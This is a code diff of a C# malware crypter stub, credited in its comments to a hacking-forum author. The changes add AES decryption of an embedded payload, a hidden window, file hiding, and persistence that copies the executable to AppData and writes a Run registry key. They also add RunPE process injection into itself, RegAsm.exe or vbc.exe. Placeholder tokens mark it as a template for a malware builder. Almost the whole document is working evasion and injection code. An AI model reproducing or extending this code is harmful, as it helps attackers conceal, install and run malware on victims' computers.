@@ -9,7 +9,18 @@ using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Diagnostics;
 using System.ComponentModel;
-
+using System.Text;
+[assembly: AssemblyTitle("[title-replace]")]
+[assembly: AssemblyDescription("[desc-replace]")]
+[assembly: AssemblyCompany("[company-replace]")]
+[assembly: AssemblyProduct("[product-replace]")]
+[assembly: AssemblyCopyright("[copyright-replace]")]
+[assembly: AssemblyTrademark("[trademark-replace]")]
+[assembly: AssemblyVersion("[version-replace]")]
+[assembly: AssemblyFileVersion("[fversion-replace]")]
+//Copyright 2016
+//Made by mrmutt for hackforums uid=3005497
+//Please leave this note here
 namespace stupidcancercodeisruiningeverything
 {
 
@@ -28,6 +39,7 @@ namespace stupidcancercodeisruiningeverything
 
     class Reader
     {
+		//Reading the encrypted bytes from our resource file
         public static byte[] ReadManaged()
         {
             ResourceManager manager = new ResourceManager("Encrypted", Assembly.GetEntryAssembly());
@@ -36,20 +48,12 @@ namespace stupidcancercodeisruiningeverything
         }
     }
 
-    //class Binder
-    //{
-    //    public static byte[] ReadBinder()
-    //    {
-    //        ResourceManager bmanager = new ResourceManager("BindF",Assembly.GetEntryAssembly());
-    //        byte[] binderBytes = (byte[])bmanager.GetObject("BFile");
-    //        return binderBytes;
-    //    }
-    //}
     public class FrmOne : Form
     {
-
+		//Making the form hidden
         private void InitializeComponent()
         {
+		
             SuspendLayout();
             ResumeLayout(false);
             PerformLayout();
@@ -57,100 +61,101 @@ namespace stupidcancercodeisruiningeverything
             WindowState = FormWindowState.Minimized;
 
         }
-
+		//Self explantory
         bool _startup = [startup-replace];
         string injectTo = "[inject-replace]";
-        string injectionPath1 = Assembly.GetExecutingAssembly().Location;
         string injectionPath2 = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe");
         string injectionPath3 = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");
-        //private string bPath = Path.Combine(Environment.SpecialFolder.ApplicationData + "bfile.exe");
         public FrmOne()
         {
 
             InitializeComponent();
+			//Basic delay
             Thread.Sleep([delay-replace] * 100);
+			//Giving a byte array for our encrypted bytes
             byte[] fBytes = Reader.ReadManaged();
-            //byte[] bBytes = Binder.ReadBinder();
-            string encKey = "[key-replace]";
-            string encMethod = "[encmethod-replace]";
-            if (encMethod == "polydex")
-                PolyDexDecrypt(fBytes, encKey);
+			//The encryption key
+			string encKey = "[key-replace]";
+			//The encryption key in bytes
+			byte[] encKey2 = Encoding.UTF8.GetBytes(encKey);
+			//Makign a hash for the encryption key
+			encKey2 = SHA256.Create().ComputeHash(encKey2);
+			//The decrypted bytes
+            byte[] eBytes = AESDecrypt(fBytes,encKey2);
+			//Crypting process
+			string result = Encoding.UTF8.GetString(eBytes);
+			//The all decrypted bytes
+			byte[] eBytes2 = Convert.FromBase64String(result);
+			//If user choosed startup add to startup
             if (_startup)
                 AddToStartup();
-
+			//Make the file hidden
             HideFile();
             Thread.Sleep(500);
 
-            
+            //Use the runpe to inject the decrypted bytes into a process of our injection method choice
             if(injectTo == "[itself]")
-            RunPe1.Run(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName,"",fBytes);
+            RunPe1.Run(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName,"",eBytes2);
             if(injectTo =="[regasm]")
-            RunPe1.Run(injectionPath2, "", fBytes);
+            RunPe1.Run(injectionPath2, "", eBytes2);
             if(injectTo == "[vbc]")
-            RunPe1.Run(injectionPath3, "", fBytes);
-            //File.Create(bPath);
-            //File.WriteAllBytes(bPath, bBytes);
-            //Process.Start(bPath);
-            //Environment.Exit(0);
-        }
-        public static byte[] PolyBabyDecrypt(byte[] input, string Key)
-        {
-            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
-            byte[] Out = new byte[input.Length - 1];
-            int x = input[input.Length - 1];
-            for (int i = 0; i <= Out.Length - 1; i++) Out[i] = (byte)(input[i] ^ (key[i % key.Length] + x) & 255);
-            return Out;
+            RunPe1.Run(injectionPath3, "", eBytes2);
+			//Stopping the program because runpe is already injected
+            Environment.Exit(0);
         }
 
-        public static byte[] PolyDexDecrypt(byte[] plain, string Key)
+        //Decryption method
+		public static byte[] AESDecrypt(byte[] decrypted, byte[] key2)
         {
-            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
-            byte[] expandedKey;
-            byte[] dKey = key;
-            int length = plain.Length;
-            if (dKey.Length >= length) expandedKey = dKey;
-            else
+            byte[] decryptedBytes = null;
+
+            byte[] saltBytes = new byte[] {1, 2, 3, 4, 5, 6, 7, 8};
+
+            using (MemoryStream ms = new MemoryStream())
             {
-                byte[] rconst = BitConverter.GetBytes(Math.Round(Math.PI, 3));
-                byte[] result = new byte[length];
-                Buffer.BlockCopy(dKey, 0, result, 0, dKey.Length);
-                for (int i = dKey.Length; i < length; i++)
-                    result[i] = (byte)((dKey[(i - dKey.Length) % dKey.Length] ^ (result[i - 1])) % 256);
-                for (int round = 0; round < 5; round++)
+                using (RijndaelManaged AES = new RijndaelManaged())
                 {
-                    result[0] = (byte)(result[0] ^ rconst[round]);
-                    for (int i = 1; i < result.Length; i++)
-                        result[i] = (byte)(((result[i] ^ (byte)(rconst[round] << (i % 3))) ^ result[i - 1]) % 256);
+                    AES.KeySize = 256;
+                    AES.BlockSize = 128;
+
+                    Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(key2, saltBytes, 1000);
+                    AES.Key = key.GetBytes(AES.KeySize/8);
+                    AES.IV = key.GetBytes(AES.BlockSize/8);
+
+                    AES.Mode = CipherMode.CBC;
+
+                    using (CryptoStream cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
+                    {
+                        cs.Write(decrypted, 0, decrypted.Length);
+                        cs.Close();
+                    }
+                    decryptedBytes = ms.ToArray();
                 }
-                expandedKey = result;
             }
-            byte[] wholeState = plain;
-            byte magic = plain[plain.Length - 1];
-            Array.Resize(ref wholeState, wholeState.Length - 1);
-            for (int i = 0; i < wholeState.Length; i++) wholeState[i] = (byte)(wholeState[i] ^ magic ^ expandedKey[i]);
-            return wholeState;
+            return decryptedBytes;
         }
-        public static byte[] StairsDecrypt(byte[] Data, string Key)
-        {
-            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
-            for (int i = (Data.Length * 2) + key.Length; i >= 0; i += -1)
-            {
-                Data[i % Data.Length] = (byte)(((int)(Data[i % Data.Length] ^ key[i % key.Length]) - (int)(Data[(i + 1) % Data.Length]) + 256) % 256);
-            }
-            return Data;
-        }
+		//The adding to startup
         public void AddToStartup()
         {
-            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            if (key != null) key.SetValue("CryptedFile", Application.ExecutablePath);
+			
+            string path = Path.Combine(Application.UserAppDataPath, "/[fname-replace]");
+            string path2 = Path.Combine(path, "[finame-replace].exe");
+            if (!File.Exists(path2))
+            {
+                DirectoryInfo di = Directory.CreateDirectory(path);
+                File.Copy(Application.ExecutablePath, path2, true);
+                RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                if (key != null) key.SetValue("[regkey-replace]", path2);
+            }
         }
 
         public void HideFile()
         {
+			//Hiding
             FileInfo f = new FileInfo(Application.ExecutablePath);
             f.Attributes = FileAttributes.Hidden;
         }
-        
+		
     }
 
     
